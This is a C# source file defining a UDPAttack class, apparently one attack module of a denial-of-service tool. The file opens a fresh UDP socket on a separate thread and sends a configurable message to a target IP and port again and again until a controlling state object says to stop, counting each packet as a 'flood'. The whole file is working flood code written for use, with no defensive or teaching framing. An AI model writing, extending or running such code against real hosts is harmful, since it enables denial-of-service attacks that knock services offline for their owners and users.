using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace Noah.Attacks
{
    /// <summary>
    /// Class for a UDP Attack.
    /// </summary>
    public class UDPAttack : IAttack
    {
        /// <summary>
        /// The Attack Name.
        /// </summary>
        public string AttackName { get; private set; }

        private ApplicationState state;
        private string ip;
        private int port;
        /// <summary>
        /// Initializes a new UDP Attack.
        /// </summary>
        /// <param name="state">The Application State.</param>
        /// <param name="host">The IP to target.</param>
        /// <param name="port">The port to target.</param>
        public UDPAttack(ApplicationState state, string host, int port = 80)
        {
            this.state = state;
            ip = host;
            this.port = port;
        }
        /// <summary>
        /// Starts the attack on a new thread.
        /// </summary>
        public void BeginAttack()
        {
            new Thread(() => attack()).Start();
        }

        private void attack()
        {
            // Change the state to an attack mode.
            state.State = States.Attacking;
            // Turn the message into a byte array.
            byte[] bytes = Encoding.ASCII.GetBytes(state.Message);
            // Turn the IP and port into an IPEndPoint for Socket.SendTo().
            IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(ip), port);

            // Loop until the overlord thread in Application State tells us to be done.
            while (state.State != States.Done)
            {
                // Using will dispose of the socket.
                using (Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp))
                    // Send the bytes to the IPEndPoint.
                    sock.SendTo(bytes, endPoint);

                // Sleep between ticks.
                Thread.Sleep(state.Delay);
                // Increment the flood count.
                state.FloodCount++;
            }
        }
    }
}
